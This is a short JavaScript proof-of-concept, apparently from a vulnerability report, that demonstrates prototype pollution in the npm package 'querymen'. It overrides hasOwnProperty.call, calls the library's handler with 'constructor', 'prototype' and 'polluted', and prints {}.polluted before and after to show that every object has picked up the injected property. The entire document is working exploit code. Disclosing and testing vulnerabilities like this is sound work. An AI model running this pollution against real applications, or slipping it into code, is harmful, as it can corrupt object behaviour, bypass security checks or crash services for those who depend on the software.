Object.prototype.hasOwnProperty.call = () => true;
var a = require('querymen');
obj = {};
console.log({}.polluted);
a.handler('constructor', 'prototype', 'polluted', 'yes');
console.log({}.polluted);